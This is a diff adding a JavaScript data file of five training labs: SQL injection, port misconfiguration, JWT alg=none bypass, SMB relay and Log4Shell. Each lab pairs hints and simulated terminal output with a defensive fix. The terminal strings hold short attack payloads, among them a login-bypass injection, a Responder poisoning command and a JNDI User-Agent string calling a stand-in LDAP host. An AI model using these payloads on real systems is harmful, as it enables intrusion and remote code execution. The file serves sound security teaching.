@@ -1,0 +1,63 @@
+const labs = [
+  {
+    id: "sql-injection",
+    title: "SQL Injection",
+    icon: "💉",
+    category: "Application Security",
+    scenario: "A login endpoint concatenates user input directly into SQL.",
+    hints: ["Inspect login query construction.", "Try quote breaking payloads.", "Use UNION selectively."],
+    terminal: [
+      "$ curl -X POST /login -d \"user=admin' --&pass=x\"",
+      "[+] Authentication bypassed",
+      "[!] Privileged dashboard access granted",
+    ],
+    solution: "Use parameterized queries and server-side validation; never interpolate user input in SQL statements.",
+  },
+  {
+    id: "port-misconfiguration",
+    title: "Open Port Misconfiguration",
+    icon: "🔓",
+    category: "Network Security",
+    scenario: "Scan a network segment and identify misconfigured services exposing sensitive data.",
+    objectives: [
+      "Perform a port scan",
+      "Identify unnecessary open ports",
+      "Recommend firewall rules",
+    ],
+    hints: ["Review firewall ACLs.", "Check services listening on all interfaces.", "Use least exposure principle."],
+    terminal: ["$ nmap -p 8080 10.0.0.0/24", "[+] 10.0.0.14:8080 open", "[!] Admin panel lacks IP restrictions"],
+    solution: "Bind admin services to localhost/VPN only and enforce ingress allowlists.",
+  },
+  {
+    id: "auth-bypass",
+    title: "Authentication Bypass",
+    icon: "🔐",
+    category: "Authentication",
+    scenario: "JWT validation does not enforce signature algorithm constraints.",
+    hints: ["Inspect JWT verification options.", "Look for alg=none acceptance.", "Confirm role claims are verified."],
+    terminal: ["$ jwt-tool token --alg none", "[+] Forged token accepted", "[!] Role escalated to admin"],
+    solution: "Pin accepted algorithms, verify signature and issuer/audience claims, and rotate secrets.",
+  },
+  {
+    id: "smb-relay",
+    title: "SMB Relay Attack",
+    icon: "📡",
+    category: "Network Security",
+    scenario: "LLMNR/NBT-NS poisoning allows credential relay to SMB service.",
+    hints: ["Disable legacy name resolution.", "Enforce SMB signing.", "Segment privileged hosts."],
+    terminal: ["$ responder -I eth0", "[+] Captured NTLM challenge", "[!] Relay succeeded against host 10.0.0.25"],
+    solution: "Disable LLMNR/NBT-NS, enable SMB signing, and use EPA where available.",
+  },
+  {
+    id: "log4shell",
+    title: "Log4Shell Exploit",
+    icon: "☣️",
+    category: "Application Security",
+    scenario: "Application logs unsanitized user-agent strings using vulnerable Log4j.",
+    hints: ["Inspect log dependencies.", "Search for JNDI patterns.", "Check outbound LDAP controls."],
+    terminal: ["$ curl -H \"User-Agent: ${jndi:ldap://x.y.z/a}\" /", "[+] Callback detected", "[!] Remote code execution path confirmed"],
+    solution: "Upgrade Log4j, block JNDI lookups, and restrict outbound LDAP/RMI traffic.",
+  },
+];
+
+module.exports = { labs };
